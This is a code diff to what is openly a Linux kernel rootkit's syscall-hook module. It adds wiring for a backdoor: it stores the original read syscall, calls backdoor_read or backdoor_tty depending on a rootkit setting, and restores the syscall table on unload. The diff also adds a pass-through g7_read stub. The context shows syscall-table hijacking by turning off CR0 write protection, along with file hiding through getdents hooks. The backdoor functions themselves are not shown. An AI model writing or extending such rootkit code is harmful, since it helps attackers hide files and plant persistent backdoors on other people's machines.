@@ -9,14 +9,17 @@
 #include "hook.h"
 #include "rootkit.h"
 #include "filehide.h"
+#include "backdoor.h"
 
 extern rootkit_t rootkit;
 
 void **sys_calls;
 
+atomic_t read_count;
 atomic_t getdents_count;
 atomic_t getdents64_count;
 
+asmlinkage ssize_t (*sys_read)(int, void *, size_t);
 asmlinkage long (*sys_getdents)(const struct pt_regs *);
 asmlinkage long (*sys_getdents64)(const struct pt_regs *);
 
@@ -37,6 +40,9 @@ retrieve_sys_call_table(void)
 void
 init_hooks(void)
 {
+    atomic_set(&read_count, 0);
+    sys_read = (void *)sys_calls[__NR_read];
+
     atomic_set(&getdents_count, 0);
     sys_getdents = (void *)sys_calls[__NR_getdents];
 
@@ -45,6 +51,11 @@ init_hooks(void)
 
     if (rootkit.hiding_files)
         hide_files();
+
+    if (rootkit.backdoor == BD_READ)
+        backdoor_read();
+    else if (rootkit.backdoor == BD_TTY)
+        backdoor_tty();
 }
 
 void
@@ -61,6 +72,13 @@ remove_hooks(void)
         sys_calls[__NR_getdents64] = (void *)sys_getdents64;
         enable_protection();
     }
+
+    if (rootkit.backdoor != BD_OFF) {
+        while (atomic_read(&read_count) > 0);
+        disable_protection();
+        sys_calls[__NR_read] = (void *)sys_read;
+        enable_protection();
+    }
 }
 
 void
@@ -75,6 +93,13 @@ enable_protection(void)
     write_cr0(read_cr0() | 0x10000);
 }
 
+
+asmlinkage ssize_t
+g7_read(int fd, void *buf, size_t count)
+{
+    DEBUG_INFO("testing g7_read\n");
+    return sys_read(fd, buf, count);
+}
 
 // https://elixir.bootlin.com/linux/v4.19/source/arch/x86/entry/syscall_64.c
 // https://elixir.bootlin.com/linux/v4.19/source/arch/x86/include/asm/ptrace.h#L12
